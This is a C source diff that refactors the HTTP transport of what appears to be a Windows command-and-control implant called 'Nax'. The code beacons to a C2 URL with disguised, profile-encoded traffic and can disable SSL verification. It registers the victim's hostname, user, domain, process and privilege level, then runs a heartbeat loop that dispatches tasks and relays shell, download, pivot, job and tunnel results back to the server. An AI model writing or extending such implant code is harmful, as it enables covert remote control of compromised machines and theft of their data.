@@ -138,6 +138,7 @@ FUNC INT NaxHttpPost( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, co
     PCHAR     meta_enc      = NULL;
     PWCHAR    hdrs          = NULL;
 
+    /* Select URI from profile or use bootstrap URL */
     WCHAR use_url[256];
     if ( Nax->Config.ProfileLoaded && Nax->Config.PostUriCount > 0 ) {
         BYTE idx  = Nax->Config.PostUriIdx;
@@ -150,6 +151,7 @@ FUNC INT NaxHttpPost( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, co
         use_url[len] = L'\0';
     }
 
+    /* Parse URL components */
     URL_COMPONENTS uc;
     MmZero( &uc, sizeof( uc ) );
     uc.dwStructSize     = sizeof( uc );
@@ -163,6 +165,7 @@ FUNC INT NaxHttpPost( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, co
 
     if ( ! NaxHttpEnsureSession( Nax, host, uc.nPort ) ) goto cleanup;
 
+    /* Encode session ID per PostClientMeta OutputConfig */
     meta_enc = (PCHAR)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, 2048 );
     UINT32 meta_enc_len = 0;
     UINT32 sid_len = 0;
@@ -173,6 +176,7 @@ FUNC INT NaxHttpPost( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, co
         if ( meta_enc_len > 0 ) meta_enc[ meta_enc_len ] = '\0';
     }
 
+    /* Encode body per PostClientOutput OutputConfig */
     PBYTE  send_body     = (PBYTE)body;
     UINT32 send_body_len = body_len;
 
@@ -181,12 +185,10 @@ FUNC INT NaxHttpPost( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, co
         body_enc_buf = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, body_enc_cap );
         if ( !body_enc_buf ) goto cleanup;
 
-        if ( Nax->Config.ProfileLoaded && Nax->Config.PostClientOutput.Format != NAX_FMT_RAW ) {
-            UINT32 enc_len = NaxEncodeData( Nax, &Nax->Config.PostClientOutput, body, body_len, body_enc_buf, body_enc_cap );
-            if ( enc_len > 0 ) {
-                send_body     = body_enc_buf;
-                send_body_len = enc_len;
-            }
+        UINT32 enc_len = NaxHttpEncodeBody( Nax, body, body_len, body_enc_buf, body_enc_cap );
+        if ( enc_len > 0 ) {
+            send_body     = body_enc_buf;
+            send_body_len = enc_len;
         }
     }
 
@@ -205,6 +207,7 @@ FUNC INT NaxHttpPost( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, co
             NaxHttpDisableSslVerify( Nax, hRequest );
     }
 
+    /* Build headers */
     hdrs = (PWCHAR)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, 4096 );
     if ( Nax->Config.ProfileLoaded ) {
         NaxBuildRequestHeaders( Nax, sid, (const PCHAR)Nax->Config.PostClientHdrs, 256, Nax->Config.PostClientHdrCount, &Nax->Config.PostClientMeta, meta_enc_len > 0 ? meta_enc : NULL, meta_enc_len, TRUE, hdrs, 2048 );
@@ -230,20 +233,11 @@ FUNC INT NaxHttpPost( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, co
     if ( ! Nax->Winhttp.WinHttpReceiveResponse( hRequest, NULL ) )
         goto retry;
 
+    /* Read raw response */
     rc = NaxReadResponse( Nax, hRequest, resp_buf, resp_len );
 
-    if ( rc == NAX_OK && *resp_len > 0 && Nax->Config.ProfileLoaded && ( Nax->Config.PostServerOutput.Format != NAX_FMT_RAW || Nax->Config.PostServerOutput.Mask || Nax->Config.PostServerOutput.PrependLen > 0 || Nax->Config.PostServerOutput.AppendLen > 0 ) ) {
-        UINT32 dec_cap = *resp_len + 256;
-        PBYTE dec_buf = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, dec_cap );
-        if ( dec_buf ) {
-            UINT32 dec_len = NaxDecodeData( Nax, &Nax->Config.PostServerOutput, resp_buf, *resp_len, dec_buf, dec_cap );
-            if ( dec_len > 0 && dec_len <= dec_cap ) {
-                MmCopy( resp_buf, dec_buf, dec_len );
-                *resp_len = dec_len;
-            }
-            Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, dec_buf );
-        }
-    }
+    if ( rc == NAX_OK && *resp_len > 0 )
+        NaxHttpDecodeResponse( Nax, NAX_TXN_POST, resp_buf, *resp_len, resp_buf, resp_len );
     goto cleanup;
 
 retry:
@@ -266,6 +260,7 @@ FUNC INT NaxHttpGet( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, con
     PCHAR     meta_enc = NULL;
     PWCHAR    hdrs     = NULL;
 
+    /* Encode encrypted body per GetClientMeta OutputConfig */
     meta_enc = (PCHAR)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, 2048 );
     if ( !meta_enc ) return NAX_ERR_NOMEM;
     UINT32 meta_enc_len = 0;
@@ -280,6 +275,7 @@ FUNC INT NaxHttpGet( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, con
         if ( meta_enc_len == 0 ) { rc = NAX_ERR_NOMEM; goto cleanup; }
     }
 
+    /* Build URL from bootstrap host + profile GET URI */
     WCHAR use_url[256];
     if ( Nax->Config.GetUriCount > 0 ) {
         BYTE idx  = Nax->Config.GetUriIdx;
@@ -303,9 +299,11 @@ FUNC INT NaxHttpGet( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, con
     uc.dwUrlPathLength = 512;
     if ( ! Nax->Winhttp.WinHttpCrackUrl( use_url, 0, 0, &uc ) ) goto cleanup;
 
+    /* Ensure persistent session + connection */
     if ( ! NaxHttpEnsureSession( Nax, host, uc.nPort ) ) goto cleanup;
 
     {
+        /* Build final path with parameters (metadata + static params) */
         WCHAR final_path[1024];
         if ( Nax->Config.ProfileLoaded ) {
             NaxBuildPathWithParams( path_w, final_path, 1024, &Nax->Config.GetClientMeta, meta_enc, meta_enc_len, (const PCHAR)Nax->Config.GetClientParams, 128, Nax->Config.GetClientParamCount );
@@ -329,6 +327,7 @@ FUNC INT NaxHttpGet( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, con
             NaxHttpDisableSslVerify( Nax, hRequest );
     }
 
+    /* Build headers */
     hdrs = (PWCHAR)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, 4096 );
     if ( Nax->Config.ProfileLoaded ) {
         NaxBuildRequestHeaders( Nax, sid, (const PCHAR)Nax->Config.GetClientHdrs, 256, Nax->Config.GetClientHdrCount, &Nax->Config.GetClientMeta, meta_enc, meta_enc_len, FALSE, hdrs, 2048 );
@@ -352,6 +351,7 @@ FUNC INT NaxHttpGet( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, con
         hdrs[ wi ] = L'\0';
     }
 
+    /* Determine body for WinHttpSendRequest based on placement */
     {
         PVOID  req_body     = NULL;
         DWORD  req_body_len = 0;
@@ -385,40 +385,10 @@ FUNC INT NaxHttpGet( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, con
         UINT32 readLen = readCap;
         rc = NaxReadResponse( Nax, hRequest, readBuf, &readLen );
 
-        if ( rc == NAX_OK && readLen > 0 && Nax->Config.ProfileLoaded && ( Nax->Config.GetServerOutput.Format != NAX_FMT_RAW || Nax->Config.GetServerOutput.Mask || Nax->Config.GetServerOutput.PrependLen > 0 || Nax->Config.GetServerOutput.AppendLen > 0 ) ) {
-            UINT32 dec_cap = readLen + 256;
-            PBYTE dec_buf = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, dec_cap );
-            if ( dec_buf ) {
-                UINT32 dec_len = NaxDecodeData( Nax, &Nax->Config.GetServerOutput, readBuf, readLen, dec_buf, dec_cap );
-                if ( dec_len > 0 && dec_len <= dec_cap ) {
-                    if ( readBuf == resp_buf ) {
-                        MmCopy( resp_buf, dec_buf, dec_len );
-                        *resp_len = dec_len;
-                    } else {
-                        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, readBuf );
-                        Nax->DynResp    = dec_buf;
-                        Nax->DynRespLen = dec_len;
-                        *resp_len       = 0;
-                        dec_buf         = NULL;
-                    }
-                }
-                if ( dec_buf )
-                    Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, dec_buf );
-            } else if ( readBuf != resp_buf ) {
-                Nax->DynResp    = readBuf;
-                Nax->DynRespLen = readLen;
-                *resp_len       = 0;
-            }
+        if ( rc == NAX_OK ) {
+            NaxHttpDecodeResponse( Nax, NAX_TXN_GET, readBuf, readLen, resp_buf, resp_len );
         } else if ( readBuf != resp_buf ) {
-            if ( rc == NAX_OK ) {
-                Nax->DynResp    = readBuf;
-                Nax->DynRespLen = readLen;
-                *resp_len       = 0;
-            } else {
-                Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, readBuf );
-            }
-        } else {
-            *resp_len = readLen;
+            Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, readBuf );
         }
     }
     goto cleanup;
@@ -442,76 +412,6 @@ FUNC INT NaxHttpGetOrPost( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR si
     return NaxHttpPost( Nax, url_w, sid, body, body_len, resp_buf, resp_len );
 }
 
-/* ========= [ HTTP main loop helpers ] ========= */
-
-FUNC static INT HttpSendResult( PNAX_INSTANCE Nax, UINT32 tid, BYTE status, const PBYTE data, UINT32 data_len, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, PWCHAR c2_url, PBYTE resp, UINT32 resp_cap ) {
-    UINT32 frame_len = frame_cap;
-    if ( NaxBuildResult( tid, status, data, data_len, frame, &frame_len ) != NAX_OK ) return NAX_ERR_FAIL;
-    UINT32 env_len = env_cap;
-    if ( NaxEncrypt( Nax, frame, frame_len, env, &env_len ) != NAX_OK ) return NAX_ERR_FAIL;
-    UINT32 resp_len = resp_cap;
-    return NaxSend( Nax, c2_url, Nax->SessionId, env, env_len, resp, &resp_len );
-}
-
-FUNC static VOID HttpRelayPivots( PNAX_INSTANCE Nax, PBYTE result, UINT32 result_cap, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, PWCHAR c2_url, PBYTE resp, UINT32 resp_cap ) {
-    UINT32 piv_len = NaxProcessPivots( Nax, result, result_cap );
-    PBYTE  piv_cur = result;
-    UINT32 piv_rem = piv_len;
-    while ( piv_rem >= 4 ) {
-        UINT32 entryLen = *(UINT32*)piv_cur;
-        if ( entryLen == 0 || 4 + entryLen > piv_rem ) break;
-        HttpSendResult( Nax, 0, NAX_STATUS_OK, piv_cur + 4, entryLen, frame, frame_cap, env, env_cap, c2_url, resp, resp_cap );
-        piv_cur += 4 + entryLen;
-        piv_rem -= 4 + entryLen;
-    }
-    if ( piv_len > 0 )
-        NaxDbg( Nax, "[pivot] processed %u bytes of child data", piv_len );
-}
-
-FUNC static VOID HttpRelayJobs( PNAX_INSTANCE Nax, PBYTE result, UINT32 result_cap, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, PWCHAR c2_url, PBYTE resp, UINT32 resp_cap ) {
-    UINT32 job_len = NaxProcessJobs( Nax, result, result_cap );
-    UINT32 joff = 0;
-    while ( joff + 9 <= job_len ) {
-        BYTE   jtype = result[ joff ];
-        UINT32 jtid  = NaxR32( result + joff + 1 );
-        UINT32 jdata = NaxR32( result + joff + 5 );
-        if ( joff + 9 + jdata > job_len ) break;
-        HttpSendResult( Nax, jtid, jtype, result + joff + 9, jdata, frame, frame_cap, env, env_cap, c2_url, resp, resp_cap );
-        joff += 9 + jdata;
-    }
-}
-
-FUNC static VOID HttpRelayShells( PNAX_INSTANCE Nax, PBYTE result, UINT32 result_cap, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, PWCHAR c2_url, PBYTE resp, UINT32 resp_cap ) {
-    UINT32 sh_len = NaxProcessShells( Nax, result, result_cap );
-    UINT32 soff = 0;
-    while ( soff + 9 <= sh_len ) {
-        BYTE   stype = result[ soff ];
-        UINT32 stid  = NaxR32( result + soff + 1 );
-        UINT32 sdata = NaxR32( result + soff + 5 );
-        if ( soff + 9 + sdata > sh_len ) break;
-        HttpSendResult( Nax, stid, stype, result + soff + 9, sdata, frame, frame_cap, env, env_cap, c2_url, resp, resp_cap );
-        soff += 9 + sdata;
-    }
-}
-
-FUNC static VOID HttpRelayDownloads( PNAX_INSTANCE Nax, PBYTE result, UINT32 result_cap, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, PWCHAR c2_url, PBYTE resp, UINT32 resp_cap ) {
-    UINT32 dl_len = NaxProcessDownloads( Nax, result, result_cap );
-    UINT32 doff = 0;
-    while ( doff + 8 <= dl_len ) {
-        UINT32 tid  = NaxR32( result + doff );
-        UINT32 dlen = NaxR32( result + doff + 4 );
-        if ( doff + 8 + dlen > dl_len ) break;
-        HttpSendResult( Nax, tid, NAX_STATUS_OK, result + doff + 8, dlen, frame, frame_cap, env, env_cap, c2_url, resp, resp_cap );
-        doff += 8 + dlen;
-    }
-}
-
-FUNC static VOID HttpRelayTunnels( PNAX_INSTANCE Nax, PBYTE result, UINT32 result_cap, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, PWCHAR c2_url, PBYTE resp, UINT32 resp_cap ) {
-    UINT32 tun_len = NaxProcessTunnels( Nax, result, result_cap );
-    if ( tun_len > 0 )
-        HttpSendResult( Nax, 0, NAX_STATUS_TUNNEL, result, tun_len, frame, frame_cap, env, env_cap, c2_url, resp, resp_cap );
-}
-
 /* ========= [ NaxHttpMain - HTTP register + heartbeat loop ] ========= */
 
 FUNC VOID NaxHttpMain( PNAX_INSTANCE Nax ) {
@@ -526,15 +426,18 @@ FUNC VOID NaxHttpMain( PNAX_INSTANCE Nax ) {
     PBYTE env_h    = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, FRAME_CAP );
     if ( !resp_h || !plain_h || !result_h || !frame_h || !env_h ) return;
 
+    /* session id */
     BYTE raw[8];
     Nax->Bcrypt.BCryptGenRandom( NULL, raw, 8, BCRYPT_USE_SYSTEM_PREFERRED_RNG );
     NaxHexEncode( raw, 8, Nax->SessionId );
     NaxDbg( Nax, "session: %s", Nax->SessionId );
     NaxDbg( Nax, "beacon_id_hdr: %s", Nax->Config.BeaconIdHdr );
 
+    /* C2 URL (wide) */
     WCHAR c2_url_w[128];
     NaxAsciiToWide( Nax->Config.C2Url, c2_url_w, 128 );
 
+    /* gather system info */
     NAX_SYSINFO info;
     NaxGatherSysInfo( Nax, &info );
 
@@ -548,7 +451,7 @@ FUNC VOID NaxHttpMain( PNAX_INSTANCE Nax ) {
         frame_len = FRAME_CAP; env_len = FRAME_CAP; resp_len = IO_CAP;
 
         BYTE   reg_body[NAX_REG_BODY_BUF]; UINT32 reg_body_len = NAX_REG_BODY_BUF;
-        if ( NaxBuildRegBody( info.Hostname, info.HnLen, info.Username, info.UnLen, NAX_ARCH_X64, info.Pid, Nax->Config.SleepMs, info.Tid, info.IpStr, info.IpLen, info.Domain, info.DmLen, info.Procname, info.PnLen, Nax->Elevated, Nax->OsMajor, Nax->OsMinor, Nax->OsBuild, Nax->ParentPid, Nax->Acp, Nax->OemCp, Nax->ImgPath, info.ImLen, reg_body, &reg_body_len ) != NAX_OK ) continue;
+        if ( NaxBuildRegBody( Nax, &info, reg_body, &reg_body_len ) != NAX_OK ) continue;
 
         if ( NaxFrameEncode( NAX_WIRE_REGISTER, reg_body, reg_body_len, frame_h, &frame_len ) != NAX_OK ) continue;
         if ( NaxEncrypt( Nax, frame_h, frame_len, env_h, &env_len ) != NAX_OK ) continue;
@@ -579,18 +482,7 @@ FUNC VOID NaxHttpMain( PNAX_INSTANCE Nax ) {
             continue;
         }
 
-        if ( saved_profile && ( Nax->Config.PostServerOutput.Format != NAX_FMT_RAW || Nax->Config.PostServerOutput.Mask || Nax->Config.PostServerOutput.PrependLen > 0 || Nax->Config.PostServerOutput.AppendLen > 0 ) ) {
-            UINT32 dec_cap = resp_len + 256;
-            PBYTE dec_buf = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, dec_cap );
-            if ( dec_buf ) {
-                UINT32 dec_len = NaxDecodeData( Nax, &Nax->Config.PostServerOutput, resp_h, resp_len, dec_buf, dec_cap );
-                if ( dec_len > 0 && dec_len <= dec_cap ) {
-                    MmCopy( resp_h, dec_buf, dec_len );
-                    resp_len = dec_len;
-                }
-                Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, dec_buf );
-            }
-        }
+        NaxHttpDecodeResponse( Nax, NAX_TXN_REGISTER, resp_h, resp_len, resp_h, &resp_len );
 
         UINT32 prof_plain_len = IO_CAP;
         if ( NaxDecrypt( Nax, resp_h, resp_len, plain_h, &prof_plain_len ) != NAX_OK || prof_plain_len < NAX_FRAME_HDR ) {
@@ -679,6 +571,7 @@ FUNC VOID NaxHttpMain( PNAX_INSTANCE Nax ) {
             Nax->DynRespLen = 0;
         }
 
+        /* dispatch tasks */
         PBYTE  cursor       = use_plain;
         UINT32 remaining    = plain_len;
         BOOL   hadTasks     = FALSE;
@@ -713,8 +606,8 @@ FUNC VOID NaxHttpMain( PNAX_INSTANCE Nax ) {
             }
 
             NaxDbg( Nax, "[task] cmd=0x%02x done: stat=0x%02x r_len=%u", task.CmdId, r_stat, r_len );
-            INT rc = HttpSendResult( Nax, r_tid, r_stat, result_h, r_len, frame_h, FRAME_CAP, env_h, FRAME_CAP, c2_url_w, resp_h, IO_CAP );
-            NaxDbg( Nax, "[task] result sent rc=%d", rc );
+            BOOL sendOk = NaxSendResult( Nax, r_tid, r_stat, result_h, r_len, frame_h, FRAME_CAP, env_h, FRAME_CAP, c2_url_w, resp_h, IO_CAP );
+            NaxDbg( Nax, "[task] result sent ok=%d", sendOk );
         }
 
         if ( dyn_plain ) {
@@ -731,21 +624,16 @@ FUNC VOID NaxHttpMain( PNAX_INSTANCE Nax ) {
             }
         }
 
-        if ( Nax->PivotHead )
-            HttpRelayPivots( Nax, result_h, RESULT_CAP, frame_h, FRAME_CAP, env_h, FRAME_CAP, c2_url_w, resp_h, IO_CAP );
+        /* relay all subsystems */
+        NAX_RELAY_CTX rctx;
+        rctx.C2Url   = c2_url_w;
+        rctx.Resp    = resp_h;
+        rctx.RespCap = IO_CAP;
+        NaxRelayAll( Nax, result_h, RESULT_CAP, frame_h, FRAME_CAP, env_h, FRAME_CAP, &rctx );
 
-        if ( Nax->DownloadHead )
-            HttpRelayDownloads( Nax, result_h, RESULT_CAP, frame_h, FRAME_CAP, env_h, FRAME_CAP, c2_url_w, resp_h, IO_CAP );
-
-        if ( Nax->JobHead )
-            HttpRelayJobs( Nax, result_h, RESULT_CAP, frame_h, FRAME_CAP, env_h, FRAME_CAP, c2_url_w, resp_h, IO_CAP );
-
-        if ( Nax->TunnelHead )
-            HttpRelayTunnels( Nax, result_h, RESULT_CAP, frame_h, FRAME_CAP, env_h, FRAME_CAP, c2_url_w, resp_h, IO_CAP );
-
-        if ( Nax->ShellHead )
-            HttpRelayShells( Nax, result_h, RESULT_CAP, frame_h, FRAME_CAP, env_h, FRAME_CAP, c2_url_w, resp_h, IO_CAP );
-
+        /* Burst: when the server had tasks, re-check immediately so
+         * follow-up tasks queued during the sleep window are dispatched
+         * without waiting a full heartbeat cycle. */
         if ( hadTasks ) {
             NaxDbg( Nax, "[HB] burst: re-checking for tasks" );
             continue;
